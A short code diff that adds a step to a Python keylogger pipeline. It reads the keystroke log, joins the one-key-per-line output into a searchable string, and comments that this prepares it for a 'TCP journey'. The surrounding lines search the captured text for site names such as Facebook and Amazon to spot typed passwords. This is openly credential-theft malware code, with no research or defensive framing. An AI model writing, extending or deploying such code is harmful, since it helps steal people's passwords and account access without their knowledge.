@@ -6,6 +6,19 @@
 import re
 import sqlite3
 
+# Initial formatting on our raw keylogger output in preparation for TCP journey.
+
+# Each time the user presses a key, it is a separate KeyDown event - the hook program records each event on its own line
+# then inputs a carriage return.  This is hard to read, and impossible to CTRL-F, so we format it horizontally here.
+    
+# The blank space character has been altered to '`' because of problems with .join eliminating spaces.
+# Of course, if someone had '`' in a password, it would be an inconvenience. 
+file = ['`' if letter == '' else letter for letter in open('keylog_formatted.txt').read().split('\n')]
+
+the_string = ''
+for i in file:
+	the_string+=i
+
 # Search for keywords and print whether they are found. 
 key1 = ['facebook', 'Facebook', 'fbook', 'face', 'Face']
 key2 = ['amazon', 'Amazon', 'amaz']
